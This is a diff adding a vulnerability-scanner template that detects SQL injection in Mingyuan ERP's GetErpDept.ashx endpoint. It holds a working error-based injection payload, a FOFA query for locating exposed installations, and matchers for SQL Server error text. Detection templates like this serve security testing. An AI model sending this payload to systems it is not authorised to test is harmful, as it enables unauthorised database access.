@@ -1,0 +1,37 @@
+id: mingyuanyun-erp-geterpdept-ashx-sqli
+info:
+  name: Mingyuan ERP GetErpDept.ashx SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    This template detects an SQL injection vulnerability in Mingyuan ERP's GetErpDept.ashx endpoint.
+  metadata:
+    fofa-query: "app=\"明源云-ERP\""
+
+http:
+  - method: POST
+    path:
+      - "/XmjdUI/Handle/GetErpDept.ashx"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "isCompany=') and 1=@@VERSION--"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "Microsoft SQL Server"
+          - "\"server\":"
+      - type: regex
+        part: body
+        regex:
+          - "转换成数据类型(.*?)时失败"
+          - "在将(.*?)值"
+      - type: word
+        part: header
+        words:
+          - "application/json"
